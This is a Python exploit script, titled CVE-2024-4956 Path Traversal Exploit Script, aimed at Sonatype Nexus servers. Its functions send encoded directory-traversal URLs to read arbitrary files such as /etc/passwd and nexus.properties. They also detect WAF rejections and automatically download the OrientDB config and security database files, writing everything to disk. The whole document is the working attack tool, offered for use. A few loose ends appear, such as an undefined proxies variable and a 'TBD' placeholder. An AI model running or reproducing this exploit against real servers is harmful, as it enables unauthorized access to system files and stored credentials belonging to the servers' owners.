import requests
import argparse
import os

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3'}

def perform_request(url,use_proxy):
    try:
        # Send the GET request
        if use_proxy:
            response = requests.get(url, headers=headers, proxies=proxies, verify=False)
        else:
            response = requests.get(url, headers=headers, verify=False)
        return response
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def exploit_directory_traversal(base_url, file_path, use_proxy, traversal):
    encoded_file_path = file_path.replace("/", "%2F")
    
    # Construct the URL with the directory traversal payload
    payload = f"{traversal}{encoded_file_path}"
    url = f"{base_url}{payload}"
    
    try:
        # Display the current file path being tested
        print(f"[*] Testing: {file_path}")

        response =  perform_request(url=url,use_proxy=use_proxy)

        if response is not None:
            # Check if the request was successful
            if response.status_code == 200:
                if "Request Rejected" in response.text:
                    print(f"[-] WAF blocked request for {file_path}!")
                    return
                else:
                    print(f"[+] Successfully accessed: {file_path}! Content:\n{response.text}")
                    if not os.path.exists("output"):
                        os.makedirs("output")
                    with open(f"output/{file_path.replace('/', '_')}", 'w', encoding='utf-8') as file:
                        file.write(response.text)
                        print(f"[+] Saved response to output/{file_path.replace('/', '_')}!")
            elif response.status_code == 404:
                print(f"[-] File {file_path} does not exist!")
            else:
                print(f"[-] Failed to access: {file_path}! Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def check_path_traversal(base_url,file_path,use_proxy):
    """
    payload = f"/%2F%2F%2F%2F%2F%2F%2F..%2F..%2Fsonatype-work%2Fnexus3%2Fetc%2Fnexus.properties"
    payload = f"/%2F%2F%2F%2F%2F%2F%2F..%2Fetc%2Fnexus-default.properties"
    payload = f"/%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    """
    payload = "/%2F%2F%2F%2F%2F%2F%2F%2F"
    dots=".."
    encoded_file_path = file_path.replace("/", "%2F")
    for i in range(20):
        # Display the current file path being tested

        payload += f"{dots}%2F"
        final_payl = f"{payload}{encoded_file_path}"
        url = f"{base_url}/{final_payl}"
        print(f"[*] Testing for path traversal to: {final_payl}")
        response = perform_request(url=url,use_proxy=use_proxy)
        if response is not None:
            if response.status_code == 200:
                if "Request Rejected" in response.text:
                    print(f"[-] WAF blocked request for {file_path}!\n\tSuggest using a different --lfi variable!")
                    return None
                else:
                    print(f"[+] Successfully accessed: {file_path}! Content:\n{response.text}\n   Path: {final_payl}\n")
                    return payload
    print(f"TBD")

def grab_and_parse_ocf(base_url,use_proxy):
    pcls={}
    inner_pcl={}
    known_db = ["config", "security"]

    for db in known_db:
        url = f"{base_url}/%2F%2F%2F%2F%2F%2F%2F..%2F..%2Fsonatype-work%2Fnexus3%2Fdb%2F{db}%2Fdatabase.ocf"
        response = perform_request(url,use_proxy)
        if response is not None:
            if response.status_code == 200:
                start = 0
                if b"|ONLINE" in response.content:
                    print(f"[*] Parsing {db}/database.ocf entries!")
                    for x in range(len(response.content)):
                        if response.content[x] == 0x7c:
                            start = x
                            break
                    tables = response.content[start:].decode().split("|ONLINE|")
                    for t in range(1,len(tables)-1):
                        pcl_name = tables[t].split("|")[1]
                        url = f"{base_url}/%2F%2F%2F%2F%2F%2F%2F..%2F..%2Fsonatype-work%2Fnexus3%2Fdb%2F{db}%2F{pcl_name}.pcl"
                        resp2 = perform_request(url,use_proxy)
                        if resp2 is not None:
                            if resp2.status_code == 200:
                                #print(f"[+] Retrieved {len(resp2.content)} bytes for {pcl_name}")
                                if len(resp2.content) > 66560:
                                    print(f"[*] Records may exist for {pcl_name}...\n   - Storing {pcl_name}.pcl")
                                    inner_pcl[pcl_name] = resp2.content
                    pcls[db] = inner_pcl
                    print(f"[*] Finished parsing {db}/database.ocf entries!")
    return pcls

def export_pcls(pcls):
    if not os.path.exists(f"dbfiles"):
        os.makedirs(f"dbfiles")
    for db in pcls:
        if not os.path.exists(f"dbfiles/{db}"):
            os.makedirs(f"dbfiles/{db}")
        for pcl in pcls[db]:
            with open(f"dbfiles/{db}/{pcl}.pcl", 'wb') as file:
                file.write(pcls[db][pcl])
                print(f"[+] Saved response to dbfiles/{db}/{pcl}.pcl!")

def main():
    # Set up argparse to handle command line arguments
    parser = argparse.ArgumentParser(description="CVE-2024-4956 Path Traversal Exploit Script")
    parser.add_argument("-f", "--file", help="Path to the text file containing a list of file paths to test", default=None)
    parser.add_argument("-c","--check", action='store_true', help="Check path traversal")
    parser.add_argument("-l","--lfi", help="File path argument for -c (default: /etc/passwd).",
                        default="/etc/passwd")
    parser.add_argument("-d","--dbfiles", action='store_true', help="Automatically retrieve OrientDB files", default=False)
    parser.add_argument("-p", "--proxy", help="Specify proxy, i.e --proxy http://127.0.0.1:8080 (default: False)", default=False)
    parser.add_argument("-u", "--url", help="Base URL of the target server")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")  # Remove trailing slash from the base URL
    file_list_path = args.file
    use_proxy = args.proxy
    
    try:
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        traversal = "/%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F.."
        if args.check:
            traversal = check_path_traversal(base_url,args.lfi,use_proxy)
        pcls = {}
        if args.dbfiles:
            pcls = grab_and_parse_ocf(base_url,use_proxy)
            export_pcls(pcls)

        if args.file is not None:
            # Read the file paths from the text file
            with open(file_list_path, 'r') as file:
                file_paths = file.readlines()

            # Remove any leading/trailing whitespace characters
            file_paths = [path.strip() for path in file_paths]

            # Iterate over each file path and attempt directory traversal
            for file_path in file_paths:
                if file_path:  # Ensure the line is not empty
                    exploit_directory_traversal(base_url, file_path, use_proxy, traversal)
    
    except Exception as e:
        print(f"An error occurred while reading the file list: {e}")

if __name__ == "__main__":
    main()
